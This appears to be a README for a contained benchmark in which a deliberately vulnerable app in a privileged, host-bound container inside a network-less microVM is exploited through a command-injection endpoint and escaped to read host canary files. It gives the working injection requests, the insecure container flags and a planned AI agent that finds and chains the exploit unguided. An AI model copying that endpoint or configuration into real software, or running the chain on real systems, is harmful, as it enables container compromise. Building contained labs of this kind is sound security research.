# The Brig escape benchmark (BENCH)

A reproduce-along guide. By the end you will have, on your own Mac, a local-model-free,
fully contained demonstration of a container being compromised by RCE and escaped to its
host — proven by canaries, not by claims.

## What BENCH proves

A scripted exploit against a known-vulnerable app, running as a container inside the Brig,
achieves remote code execution and then escapes the container to read a secret on the VM
host. Two canaries make it a proof, not a story:

- **in-container canary** (`BRIG-RCE-INCONTAINER-7c21`): a file inside the container image.
  Reading it over the app's RCE proves code execution landed inside the container.
- **host canary** (`BRIG-HOST-SECRET-<run>`): a file on the VM host, outside any container,
  planted fresh each run. Reading it from inside the container proves the escape.

`PASS` requires both.

## The boundary (what is and isn't being escaped)

The container is escaped to the **VM guest host**. That guest is the Brig: an ephemeral,
egress-denied Apple `vz` microVM with no network device. The escape reaches that disposable
VM and nothing else. GORED never attempts, and this benchmark never tests, a hypervisor
escape (VM → your Mac); the VM is the trusted wall. This is why it is safe to run a real
RCE and a real container escape here.

## How it fits together

```
host (your Mac)                          the Brig (Apple vz microVM, no NIC)
 ┌───────────────┐   vsock bridge         ┌──────────────────────────────────────┐
 │ curl / bench  │ ─ 127.0.0.1:5050 ───▶  │ detonationd (root) runs argv, no shell │
 └───────────────┘                        │   └─ runc run ─▶ container (vulnapp)   │
                                           │        GET /exec?cmd=…  → sh -c (RCE)  │
                                           │        writable bind /host → VM host   │
                                           └──────────────────────────────────────┘
```

- The Brig has **no NIC**, so the exploit cannot come over a network. It runs **guest-side**:
  the host sends a detonation (an argv, no shell) over the vsock bridge; `detonationd` runs
  it; the argv is `wget http://127.0.0.1:8088/...` against the app on the guest loopback.
- `vulnapp` (`cmd/vulnapp`) is the deliberately vulnerable target: `GET /exec?cmd=X` runs `X`
  in a shell. It runs with **hostNetwork** so it binds the guest loopback and that `wget`
  can reach it.
- The container is **privileged** with a **writable host bind** (`/host` → the VM host `/`).
  That misconfiguration is the escape path: RCE reads `/host/root/brig-canary`.

Pieces: `cmd/vulnapp` (target), `container.go`/`cmd/brigconfig` (the OCI config with the
misconfig knobs), `cmd/prepareassets` (bakes vulnapp + the in-container canary into the
bundle), `cmd/launchbrig` (boots the Brig), `scripts/bench.sh` (the exploit + oracle).

## Prerequisites

- Apple Silicon Mac, macOS 13+ (Apple Virtualization framework).
- Go toolchain, `curl`, `python3` (for the small JSON helper in bench.sh).
- Booting the VM needs codesigning with the `com.apple.security.virtualization`
  entitlement; `brig-up.sh` does it ad-hoc (`-s -`), no Apple account needed.

## Reproduce

### 1. Boot the Brig

```bash
cd fleet/gobrig
./scripts/brig-up.sh
```

First run downloads the Kata container kernel (a few hundred MB) and the Alpine rootfs,
cross-builds `detonationd` and `vulnapp`, codesigns `launchbrig`, and boots. Leave it
running; it prints `Interactive shell ready` and the console stays attached (it is the VM
console — Ctrl-C stops the Brig). You will see `ifconfig: SIOCSIFADDR: No such device` —
that is expected and good: it confirms the guest has no network device.

### 2. Run the benchmark (new terminal tab)

```bash
cd fleet/gobrig
./scripts/bench.sh
```

Expected tail:

```
==> exploit: RCE reads the in-container canary
    in-container: BRIG-RCE-INCONTAINER-7c21
==> exploit: RCE reads the host canary (escape via the misconfig)
    host:         BRIG-HOST-SECRET-1791904982
BENCH PASS: RCE confirmed (in-container canary) and escape confirmed (host canary).
```

`bench.sh` writes the vulnerable container config, plants a fresh host canary, starts the
container, exploits the RCE to read each canary, cleans up, and checks both came back.

### Follow along manually

Everything `bench.sh` does is a detonation over the bridge. To watch it step by step:

```bash
# a tiny helper: send one argv and print the output
det(){ curl -s -X POST http://127.0.0.1:5050/ -H 'Content-Type: application/json' \
  -d "{\"argv\":$1,\"trace_id\":\"m\"}" | python3 -c 'import sys,json;print(json.load(sys.stdin)["output"])'; }

# write the vulnerable container config
go run ./cmd/brigconfig -privileged -root -hostnet -hostpath / -args /vulnapp vm-assets/bundle

# plant the host-only canary (on the VM host, outside any container)
det '["sh","-c","echo HELLO-FROM-HOST > /root/brig-canary"]'

# start the vulnapp container (detached)
det '["sh","-c","rm -rf /tmp/m1; cp -a /mnt/assets/bundle /tmp/m1; /mnt/assets/runc run -d --bundle /tmp/m1 m1 >/tmp/m1.log 2>&1 & sleep 2; /mnt/assets/runc list"]'

# RCE: run a command in the container over HTTP
det '["sh","-c","wget -qO- '"'"'http://127.0.0.1:8088/exec?cmd=id'"'"'"]'

# RCE oracle: read the in-container canary
det '["sh","-c","wget -qO- '"'"'http://127.0.0.1:8088/exec?cmd=cat%20/flag-in-container'"'"'"]'

# escape: read the host canary through the writable host bind
det '["sh","-c","wget -qO- '"'"'http://127.0.0.1:8088/exec?cmd=cat%20/host/root/brig-canary'"'"'"]'

# cleanup
det '["sh","-c","/mnt/assets/runc delete --force m1"]'
```

### The hardened control (why the misconfig matters)

Write a locked-down config and the same reads fail — no `/host`, non-root, no caps:

```bash
go run ./cmd/brigconfig -args /bin/sh vm-assets/bundle   # all knobs off
# then runc run it and try to read /host/... → "No such file or directory"; id → uid=10001; CapEff: 0
```

## Troubleshooting (gotchas we hit)

- **`bind: :5000 address already in use`** — macOS AirPlay Receiver owns :5000. The Brig
  uses `-bridge 127.0.0.1:5050`; leave it.
- **Two Brigs / stale VM** — `launchbrig` reclaims its loopback bridge port on boot, so a
  re-run lands a single live VM. If a boot looks wrong, `pkill -9 -f gobrig/bin/launchbrig`
  and re-run.
- **`runc: no cgroup mount found`** — `sandbox_init.sh` mounts cgroup2; if you changed the
  init, ensure `/sys/fs/cgroup` is mounted.
- **`mount dst=/ … invalid argument`** — the chroot root must be a tmpfs (ramfs rejects
  mount propagation). `launchbrig`'s bring-up already does this.
- **Snapshot** — off by default (`-snapshot=false`); the golden save was unverified and
  correlated with the launcher being killed. `BRIG_SNAPSHOT=true ./scripts/brig-up.sh` to try it.

## What's next: AGENT

BENCH is the oracle proven by a *scripted* exploit. AGENT replaces the hardcoded `wget`
with an agent (local models + tools, a planner and doers) that **discovers** the RCE
unguided — fuzzing `/exec`, finding the injection — then chains the escape, scored against
these same canaries. Each confirmed step becomes a `Proof` fed to the Validator (an
exploitable verdict plus the host-compromise chain).
